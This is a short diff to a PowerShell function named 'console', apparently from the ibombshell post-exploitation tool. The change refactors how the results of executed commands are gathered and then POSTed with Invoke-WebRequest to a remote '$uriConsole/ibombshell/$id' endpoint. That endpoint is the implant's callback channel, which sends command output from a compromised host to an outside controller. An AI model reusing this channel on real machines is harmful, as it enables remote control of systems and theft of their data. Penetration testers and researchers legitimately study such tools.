@@ -111,19 +111,16 @@ function console{
                     }
 
                     #Send results
-                    if ($results.GetType().Name -eq "String")
-                    {
-                        iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$results}
-                    }
-                    else
+                    if ($results.GetType().Name -ne "String")
                     {
                         $send = ""
                         foreach($i in $results)
                         {
                             $send = $send + $i + '\n'
                         }
-                        iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$send}
+                        $results = $send
                     }
+                    iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$results}
                 } 
 
                 
